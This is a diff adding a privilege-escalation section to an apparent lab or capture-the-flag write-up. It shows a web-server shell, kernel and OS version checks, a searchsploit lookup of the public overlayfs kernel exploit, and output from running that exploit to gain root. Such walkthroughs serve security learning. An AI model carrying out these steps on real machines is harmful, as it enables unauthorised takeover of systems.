@@ -136,11 +136,48 @@ $ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
+## 4.Privilege Escalation
 
+Now we just check the kernel version of the server :
 
+```bash
+$ uname -a
+Linux ubuntu 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:51:20 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
 
+$ cat /etc/os-release
+NAME="Ubuntu"
+VERSION="12.04.5 LTS, Precise Pangolin"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu precise (12.04.5 LTS)"
+VERSION_ID="12.04"
+```
 
+and check for any exploit in searchsploit :
 
+```bash
+root@kali: Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation | linux/local/37292.c
+```
+
+upload on the server and compile it and run it :
+
+```bash
+$ cd /tmp
+
+$ ./a.out
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+sh: 0: can't access tty; job control turned off
+
+# id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+```
+
+this is how you can get root on this machine :)
 
 
 
